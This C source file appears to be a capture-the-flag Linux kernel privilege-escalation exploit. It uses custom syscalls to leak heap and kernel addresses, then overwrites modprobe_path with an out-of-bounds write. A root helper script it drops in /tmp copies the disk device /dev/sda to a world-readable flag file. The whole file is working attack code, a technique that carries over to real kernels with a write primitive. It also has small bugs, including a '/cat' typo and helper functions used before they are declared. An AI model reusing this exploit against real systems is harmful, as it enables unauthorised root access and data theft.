// log in to qemu with user pwn, no password needed
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdarg.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>

// commands

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)


// utils
unsigned long user_cs,user_ss,user_sp,user_rflags;

void shell(void)
{
    if(getuid()) {
        err("Failed to get root. Exit");
        exit(0);
    }
    info("Got root. Pop root shell");
    for(int i = 0; i < 3; i++) {
        printf(".");
        sleep(0.1);
    }
}

void hexdump(unsigned char* buf, int size) {
	for (int i = 0; i < size; i++) {
		if (i % 16 == 0)
			printf("%04x: ", i);
		printf("%02x ", buf[i]);
		if (i % 16 == 15)
			printf("\n");
	}
	if (size % 16 != 0)
		printf("\n");
}


void err(const char* format, ...) {
    if (!format) {
        exit(-1);
    }
    fprintf(stderr, "%s", "\033[1;31m[!]\033[0m ");
    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "%s", "\n");
    exit(-1);
}

void info(const char* format, ...) {
    if (!format) {
        return;
    }
    fprintf(stderr, "%s", "\033[1;31m[*]\033[0m ");

    va_list args;
    va_start(args, format);
    vfprintf(stderr, format, args);
    va_end(args);
    fprintf(stderr, "%s", "\n");
}

void save_state(void)
{
    __asm__(".intel_syntax noprefix;"
            "mov user_cs,cs;"
            "mov user_ss,ss;"
            "mov user_sp,rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
	info("State saved.");
}

void set_cpu() {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(0, &my_set);
    if (sched_setaffinity(getpid(), sizeof(cpu_set_t), &my_set) == -1) {
        perror("sched_setaffinity()");
        exit(1);
    }
    info("Set to specific core");
}

void modprobe_overwrite() {
    system("echo -ne \"#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag\" > /tmp/x");
	system("echo -ne \"\xff\xff\xff\xff\" > /tmp/dummy");
	system("chmod +x /tmp/dummy");
	system("chmod +x /tmp/x");
}

uint64_t modprobe_path_offset = 0x1850da0;
uint64_t kernel_base = 0;
uint64_t write_to = 0x782f706d742f;

int main () {
    syscall(600, 0x2000000000000002);

    uint64_t heap_leak;
    uint64_t kernel_leak;

    syscall(603, 1, &heap_leak);
    info("Heap leak: 0x%lx", heap_leak);

    syscall(603, 132, &kernel_leak);
    info("Kernel leak: 0x%lx", kernel_leak);

    kernel_base = kernel_leak - 0x1577d46;
    info("Kernel base: 0x%lx", kernel_base);
    
    uint64_t modprobe_path = kernel_base + modprobe_path_offset;

    uint64_t idx = (modprobe_path - (heap_leak - 0x10)) / 8;

    syscall(602, idx, write_to);

    modprobe_overwrite();
    system("/tmp/dummy");
    system("/cat /tmp/flag");
}
